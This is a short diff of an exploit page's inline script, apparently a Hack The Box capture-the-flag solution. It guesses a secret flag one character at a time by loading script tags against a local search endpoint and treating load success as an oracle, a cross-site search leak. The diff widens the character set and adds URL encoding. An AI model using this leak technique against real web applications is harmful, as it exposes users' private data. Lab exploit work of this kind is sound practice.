@@ -3,7 +3,7 @@
     <script>
         var flag = 'HTB{';
         var success = false;
-        const chars = '@!0123456789{}abcdefghijklmnopqrstuvwxyz_';
+        const chars = '-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_';
         var char = ''
         var i = 0;
         function sendFlag() {
@@ -13,7 +13,7 @@
             return new Promise((res, rej) => {
                 try {
                     newElem = document.createElement('script');
-                    newElem.src = "http://127.0.0.1:1337/api/entries/search?q=" + (flag + char);
+                    newElem.src = "http://127.0.0.1:1337/api/entries/search?q=" + encodeURI(flag + char);
                     newElem.id = 'pooscript';  
                     newElem.onload = () => {
                         res(char)
